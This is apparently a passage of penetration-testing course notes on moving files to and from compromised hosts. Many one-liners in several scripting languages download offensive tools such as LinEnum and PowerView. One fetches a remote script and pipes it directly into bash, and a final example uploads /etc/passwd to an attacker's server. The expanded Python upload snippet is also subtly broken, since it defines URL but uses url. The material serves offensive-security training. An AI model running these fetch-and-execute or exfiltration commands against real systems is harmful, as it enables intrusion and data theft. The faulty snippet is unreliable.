
---

It's common to find different programming languages installed on the machines we are targeting.
We can use some Windows default applications, such as `cscript` and `mshta`, to execute JavaScript or VBScript code. JavaScript can also run on Linux hosts.

#### Python 2 - Download
`tylapcheong@htb[/htb]$ python2.7 -c 'import urllib;urllib.urlretrieve ("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")'`

#### Python 3 - Download
`tylapcheong@htb[/htb]$ python3 -c 'import urllib.request;urllib.request.urlretrieve("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")'`

## PHP

`PHP` is also very prevalent and provides multiple file transfer methods. [According to W3Techs' data](https://w3techs.com/technologies/details/pl-php), PHP is used by 77.4% of all websites with a known server-side programming language.

#### PHP Download with File_get_contents()
`tylapcheong@htb[/htb]$ php -r '$file = file_get_contents("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); file_put_contents("LinEnum.sh",$file);'`

An alternative to `file_get_contents()` and `file_put_contents()` is the [fopen() module](https://www.php.net/manual/en/function.fopen.php). We can use this module to open a URL, read it's content and save it into a file.
#### PHP Download with Fopen()
`tylapcheong@htb[/htb]$ php -r 'const BUFFER = 1024; $fremote =  fopen("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "rb"); $flocal = fopen("LinEnum.sh", "wb"); while ($buffer = fread($fremote, BUFFER)) { fwrite($flocal, $buffer); } fclose($flocal); fclose($fremote);'`

We can also send the downloaded content to a pipe instead, similar to the fileless example we executed in the previous section using cURL and wget.

#### PHP Download a File and Pipe it to Bash

`tylapcheong@htb[/htb]$ php -r '$lines = @file("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); foreach ($lines as $line_num => $line) { echo $line; }' | bash`

**Note:** The URL can be used as a filename with the @file function if the fopen wrappers have been enabled.

#### Ruby - Download a File
`tylapcheong@htb[/htb]$ ruby -e 'require "net/http"; File.write("LinEnum.sh", Net::HTTP.get(URI.parse("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh")))'`

---

#### Perl - Download a File
`tylapcheong@htb[/htb]$ perl -e 'use LWP::Simple; getstore("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh");'`

## JavaScript

JavaScript is a scripting or programming language that allows you to implement complex features on web pages. Like with other programming languages, we can use it for many different things.

The following JavaScript code is based on [this](https://superuser.com/questions/25538/how-to-download-files-from-command-line-in-windows-like-wget-or-curl/373068) post, and we can download a file using it. We'll create a file called `wget.js` and save the following content:

`var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1"); WinHttpReq.Open("GET", WScript.Arguments(0), /*async=*/false); WinHttpReq.Send(); BinStream = new ActiveXObject("ADODB.Stream"); BinStream.Type = 1; BinStream.Open(); BinStream.Write(WinHttpReq.ResponseBody); BinStream.SaveToFile(WScript.Arguments(1));`

We can use the following command from a Windows command prompt or PowerShell terminal to execute our JavaScript code and download a file.
#### Download a File Using JavaScript and cscript.exe
`C:\htb> cscript.exe /nologo wget.js https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 PowerView.ps1`

## VBScript

[VBScript](https://en.wikipedia.org/wiki/VBScript) ("Microsoft Visual Basic Scripting Edition") is an Active Scripting language developed by Microsoft that is modeled on Visual Basic. VBScript has been installed by default in every desktop release of Microsoft Windows since Windows 98.

The following VBScript example can be used based on this. We'll create a file called wget.vbs and save the following content:

 ```
         vbscript
dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")
dim bStrm: Set bStrm = createobject("Adodb.Stream")
xHttp.Open "GET", WScript.Arguments.Item(0), False
xHttp.Send

with bStrm
    .type = 1
    .open
    .write xHttp.responseBody
    .savetofile WScript.Arguments.Item(1), 2
end with
 ``` 

We can use the following command from a Windows command prompt or PowerShell terminal to execute our VBScript code and download a file.
#### Download a File Using VBScript and cscript.exe
```
        cmd-session
C:\htb> cscript.exe /nologo wget.vbs https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 PowerView2.ps1
```

## Upload Operations using Python3

If we want to upload a file, we need to understand the functions in a particular programming language to perform the upload operation. The Python3 [requests module](https://pypi.org/project/requests/) allows you to send HTTP requests (GET, POST, PUT, etc.) using Python. We can use the following code if we want to upload a file to our Python3 [uploadserver](https://github.com/Densaugeo/uploadserver).

#### Starting the Python uploadserver Module
`tylapcheong@htb[/htb]$ python3 -m uploadserver  File upload available at /upload Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...`

#### Uploading a File Using a Python One-liner
`tylapcheong@htb[/htb]$ python3 -c 'import requests;requests.post("http://192.168.49.128:8000/upload",files={"files":open("/etc/passwd","rb")})'`

Let's divide this one-liner into multiple lines to understand each piece better.

```
# To use the requests function, we need to import the module first.
import requests 

# Define the target URL where we will upload the file.
URL = "http://192.168.49.128:8000/upload"

# Define the file we want to read, open it and save it in a variable.
file = open("/etc/passwd","rb")

# Use a requests POST request to upload the file. 
r = requests.post(url,files={"files":file})
```